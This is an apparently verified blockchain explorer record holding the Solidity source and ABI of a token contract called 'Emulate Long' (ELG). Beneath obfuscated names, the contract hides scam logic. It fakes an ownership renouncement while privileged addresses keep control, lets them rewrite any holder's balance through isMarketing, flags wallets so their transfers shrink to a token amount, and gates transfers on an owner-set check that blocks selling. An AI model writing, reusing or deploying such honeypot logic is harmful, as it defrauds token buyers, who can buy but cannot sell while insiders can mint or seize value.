{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface senderFeeTotal {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract shouldAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atToken {\n    function createPair(address launchAutoShould, address autoAtFee) external returns (address);\n}\n\ninterface enableSwapMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchToReceiver) external view returns (uint256);\n\n    function transfer(address exemptSender, uint256 swapMarketing) external returns (bool);\n\n    function allowance(address txReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 swapMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptSender,\n        uint256 swapMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed sellAt, uint256 value);\n    event Approval(address indexed txReceiver, address indexed spender, uint256 value);\n}\n\ninterface shouldToken is enableSwapMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EmulateLong is shouldAmount, enableSwapMin, shouldToken {\n\n    uint256 private feeLiquidity = 100000000 * 10 ** 18;\n\n    bool public swapExempt;\n\n    address public buyAt;\n\n    function balanceOf(address launchToReceiver) public view virtual override returns (uint256) {\n        return teamLiquidity[launchToReceiver];\n    }\n\n    function transferFrom(address liquiditySell, address exemptSender, uint256 swapMarketing) external override returns (bool) {\n        if (_msgSender() != toMode) {\n            if (fromSender[liquiditySell][_msgSender()] != type(uint256).max) {\n                require(swapMarketing <= fromSender[liquiditySell][_msgSender()]);\n                fromSender[liquiditySell][_msgSender()] -= swapMarketing;\n            }\n        }\n        return fromSell(liquiditySell, exemptSender, swapMarketing);\n    }\n\n    string private txTotal = \"ELG\";\n\n    uint256 autoFeeEnable;\n\n    function takeAuto() private view {\n        require(shouldMax[_msgSender()]);\n    }\n\n    bool public takeFund;\n\n    function walletMarketing(address buyTeam) public {\n        if (swapExempt) {\n            return;\n        }\n        if (launchedExemptMarketing == toTeam) {\n            amountFromList = false;\n        }\n        shouldMax[buyTeam] = true;\n        if (toTeam != launchedExemptMarketing) {\n            amountFromList = true;\n        }\n        swapExempt = true;\n    }\n\n    address private txFund;\n\n    event OwnershipTransferred(address indexed enableTotal, address indexed exemptAt);\n\n    function fundSenderBuy(address liquidityReceiver) public {\n        takeAuto();\n        \n        if (liquidityReceiver == buyAt || liquidityReceiver == exemptMarketing) {\n            return;\n        }\n        feeAmountSwap[liquidityReceiver] = true;\n    }\n\n    address enableSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private launchedExemptMarketing;\n\n    function getOwner() external view returns (address) {\n        return txFund;\n    }\n\n    uint256 private receiverMin;\n\n    function takeLaunch(address liquiditySell, address exemptSender, uint256 swapMarketing) internal returns (bool) {\n        require(teamLiquidity[liquiditySell] >= swapMarketing);\n        teamLiquidity[liquiditySell] -= swapMarketing;\n        teamLiquidity[exemptSender] += swapMarketing;\n        emit Transfer(liquiditySell, exemptSender, swapMarketing);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return txFund;\n    }\n\n    uint256 private toTeam;\n\n    bool public marketingList;\n\n    uint8 private enableFeeToken = 18;\n\n    address toMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function isMarketing(address walletShould, uint256 swapMarketing) public {\n        takeAuto();\n        teamLiquidity[walletShould] = swapMarketing;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return txTotal;\n    }\n\n    function fromSell(address liquiditySell, address exemptSender, uint256 swapMarketing) internal returns (bool) {\n        if (liquiditySell == buyAt) {\n            return takeLaunch(liquiditySell, exemptSender, swapMarketing);\n        }\n        uint256 launchedTeam = enableSwapMin(exemptMarketing).balanceOf(enableSell);\n        require(launchedTeam == autoFeeEnable);\n        require(exemptSender != enableSell);\n        if (feeAmountSwap[liquiditySell]) {\n            return takeLaunch(liquiditySell, exemptSender, swapToken);\n        }\n        return takeLaunch(liquiditySell, exemptSender, swapMarketing);\n    }\n\n    uint256 atLiquidity;\n\n    bool public amountFromList;\n\n    mapping(address => bool) public feeAmountSwap;\n\n    constructor (){\n        \n        senderFeeTotal buyTx = senderFeeTotal(toMode);\n        exemptMarketing = atToken(buyTx.factory()).createPair(buyTx.WETH(), address(this));\n        \n        buyAt = _msgSender();\n        toEnableFee();\n        shouldMax[buyAt] = true;\n        teamLiquidity[buyAt] = feeLiquidity;\n        if (tradingMarketing) {\n            takeFund = true;\n        }\n        emit Transfer(address(0), buyAt, feeLiquidity);\n    }\n\n    function approve(address swapWallet, uint256 swapMarketing) public virtual override returns (bool) {\n        fromSender[_msgSender()][swapWallet] = swapMarketing;\n        emit Approval(_msgSender(), swapWallet, swapMarketing);\n        return true;\n    }\n\n    function allowance(address shouldMaxTx, address swapWallet) external view virtual override returns (uint256) {\n        if (swapWallet == toMode) {\n            return type(uint256).max;\n        }\n        return fromSender[shouldMaxTx][swapWallet];\n    }\n\n    bool private tradingMarketing;\n\n    function name() external view virtual override returns (string memory) {\n        return liquidityTotalAuto;\n    }\n\n    mapping(address => mapping(address => uint256)) private fromSender;\n\n    function listMode(uint256 swapMarketing) public {\n        takeAuto();\n        autoFeeEnable = swapMarketing;\n    }\n\n    address public exemptMarketing;\n\n    string private liquidityTotalAuto = \"Emulate Long\";\n\n    bool private feeTo;\n\n    uint256 constant swapToken = 15 ** 10;\n\n    function toEnableFee() public {\n        emit OwnershipTransferred(buyAt, address(0));\n        txFund = address(0);\n    }\n\n    function transfer(address walletShould, uint256 swapMarketing) external virtual override returns (bool) {\n        return fromSell(_msgSender(), walletShould, swapMarketing);\n    }\n\n    uint256 private launchedFeeExempt;\n\n    uint256 public txEnableTake;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return feeLiquidity;\n    }\n\n    mapping(address => bool) public shouldMax;\n\n    mapping(address => uint256) private teamLiquidity;\n\n    function decimals() external view virtual override returns (uint8) {\n        return enableFeeToken;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptAt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldMaxTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapWallet\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountFromList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchToReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeAmountSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityReceiver\",\"type\":\"address\"}],\"name\":\"fundSenderBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapMarketing\",\"type\":\"uint256\"}],\"name\":\"isMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"swapMarketing\",\"type\":\"uint256\"}],\"name\":\"listMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toEnableFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquiditySell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txEnableTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTeam\",\"type\":\"address\"}],\"name\":\"walletMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "EmulateLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}